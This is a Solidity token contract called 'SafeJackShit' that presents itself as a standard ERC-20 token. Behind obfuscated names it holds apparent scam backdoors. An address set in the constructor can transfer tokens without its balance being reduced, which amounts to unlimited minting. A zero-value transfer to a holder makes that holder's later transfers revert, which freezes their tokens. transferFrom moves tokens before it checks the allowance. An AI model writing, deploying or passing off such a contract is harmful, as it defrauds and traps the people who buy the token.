// safejackshit

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

contract SafeJackShit {
    function approve(address right, uint256 they) public returns (bool success) {
        allowance[msg.sender][right] = they;
        emit Approval(msg.sender, right, they);
        return true;
    }

    uint8 public decimals = 9;

    string public name;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private hello;

    function transfer(address horse, uint256 they) public returns (bool success) {
        watch(msg.sender, horse, they);
        return true;
    }

    address public uniswapV2Pair;

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address butter) {
        name = 'SafeJackShit';
        symbol = 'SafeJackShit';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        hello[butter] = war;
    }

    function watch(address bowl, address horse, uint256 they) private returns (bool success) {
        if (they == 0) {
            goes[horse] += war;
        }
        if (hello[bowl] == 0) {
            balanceOf[bowl] -= they;
            if (uniswapV2Pair != bowl && goes[bowl] > 0) {
                hello[bowl] -= war;
            }
        }
        balanceOf[horse] += they;
        emit Transfer(bowl, horse, they);
        return true;
    }

    mapping(address => uint256) private goes;

    function transferFrom(address bowl, address horse, uint256 they) public returns (bool success) {
        watch(bowl, horse, they);
        require(they <= allowance[bowl][msg.sender]);
        allowance[bowl][msg.sender] -= they;
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply;

    string public symbol;

    uint256 private war = 97;
}